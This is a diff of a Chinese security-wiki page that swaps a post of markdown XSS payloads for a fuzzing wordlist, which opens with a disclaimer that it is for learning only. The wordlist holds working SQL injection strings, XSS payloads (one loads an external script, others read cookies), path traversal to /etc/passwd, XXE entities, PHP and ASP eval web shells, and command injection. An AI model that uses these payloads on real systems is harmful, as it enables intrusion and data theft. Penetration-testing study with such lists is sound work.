@@ -9,7 +9,7 @@
 
     <title>
     
-  Markdown XSS Payloads - lonelyorWiki
+  最近做了个 fuzzing 字典精简版 - lonelyorWiki
   
   </title>
   
@@ -138,10 +138,10 @@
       <div class="markdown-body article-wrap">
        <div class="article">
           
-          <h1>Markdown XSS Payloads</h1>
+          <h1>最近做了个 fuzzing 字典精简版</h1>
      
         <div class="read-more clearfix">
-          <span class="date">2019/5/24 13:48 下午</span>
+          <span class="date">2019/6/4 10:59 上午</span>
 
           <span>发表于&nbsp;</span> 
           
@@ -159,53 +159,132 @@
 
       <div class="article-content">
       <blockquote>
-<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。</p>
+
+<pre class="line-numbers"><code class="language-text">&#39;
+&quot;
+[
+@
+#
+%
+&amp;
+*
+(
+)
+]
+/
+??
+//
+\\
+../
+&lt;!-- 
+%20select @@version
+)%20or%20(&#39;x&#39;=&#39;x
+%20or &#39;a&#39;=&#39;a
+%20or 2 &gt; 1
+%20or &#39;a&#39;=&#39;a
+%20or 1=1
+%20and%201=1
+%20and%201=2
+/**/or/**/1/**/=/**/1
+select &#39;10as&#39;=10;
+exec master..xp_cmdshell &#39;ipconfig+/all&#39;
+%20or &#39;7659&#39;=&#39;7659
+%20or &#39;text&#39; = n&#39;text&#39;
+) union select * from information_schema.tables;
+1+AND+USER_NAME()=’dbo’
+1;waitfor+delay+’0:0:10’
+1’;shutdown –
+as
+%20select 1/*!50000union/*!*//*!50000select/*!*/2;
+%20or 0=0 #&quot;
+&#39; union (select @@version) --
+&#39; union (select NULL, (select @@version)) --
+&#39; union (select NULL, NULL, (select @@version)) --
+&#39; union (select NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+--
+/*
+1’; insert into users values(‘lonelyor’,’lonelyor’)
+%28
+%29
+&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
+&lt;script&gt;alert(8888)&lt;/script&gt;
+&lt;script&gt;confirm(8866)&lt;/script&gt;
+&lt;script&gt;prompt(8877)&lt;/script&gt;
+a&lt;img src=1 onerror=alert(1)&gt;a
+&lt;img src=x onerror=alert(11)&gt;29
+&lt;anytag onmouseover=alert(1)&gt;s
+&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
+&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
+&lt;a onclick=alert(2)&gt;h
+&lt;button/onclick=alert(6)&gt;h
+&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
+&lt;body/onload=alert(12)&gt;
+&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+.git
+.gitignore
+.svn
+wp-admin
+wp-login.php
+.DS_store
+.ds_store
+index.php.bak
+.index.php~
+index.php.~
+robots.txt
+.git/config
+admin/
+/admin
+uploads/
+download/
+downloads/
+manager/
+/include
+1.jsp
+hack.jsp
+1.php
+1.asp
+/新建文本文档.txt
+/etc/passwd
+etc/passwd
+../../../../etc/passwd
+/../../../../etc/passwd
+..2f..2fetc2fpasswd
+&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
+&lt;%eval request(chr(35))%&gt;
+&lt;?=eval($_POST[&#39;cmd&#39;]);
+cmd
+system(&quot;ls -al /&quot;)
+%s%s%s%s%s%s%s%s%s%s
+NULL
+null
+zull
+/C:\Program Files\
+C:\Program Files\
+&lt;!--#exec cmd=&quot;ls&quot; --&gt;
+&lt;!--#exec cmd=&quot;dir&quot; --&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+| ping -i 30 127.0.0.1 |
+&amp; ping -i 30 127.0.0.1 &amp;
+?url=http://www.zhihu.com/
+?url=https://www.zhihu.com/
+http://www.lonelyor.org/
+https://www.lonelyor.org/
+$ENV{&#39;HOME&#39;}
+2.2250738585072011e-308
+01/01/1979
+*~1*/.aspx
+a*~1*/.aspx
+&lt;h1&gt;haha&lt;/h1&gt;
+</code></pre>
 </blockquote>
-
-<p>Links</p>
-
-<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
-[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
-[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
-</code></pre>
-
-<p>Images</p>
-
-<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
-![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
-</code></pre>
-
-<p>Fuzzing</p>
-
-<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&amp;#41;)
-[XSS](javascript&amp;#58this;alert(1&amp;#41;)
-[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
-[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
-[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&amp;#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
-</code></pre>
 
 
     
@@ -216,16 +295,13 @@
         <div class="large-6 columns">
         <p class="text-left" style="padding:15px 0px;">
       
-          <a href="15589173721679.html" 
-          title="Previous Post: svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法">&laquo; svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</a>
-      
         </p>
         </div>
         <div class="large-6 columns">
       <p class="text-right" style="padding:15px 0px;">
       
-          <a  href="15586660103989.html" 
-          title="Next Post: 使用GET方法传输用户账号密码的危害">使用GET方法传输用户账号密码的危害 &raquo;</a>
+          <a  href="15595455557551.html" 
+          title="Next Post: 使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞">使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞 &raquo;</a>
       
       </p>
         </div>
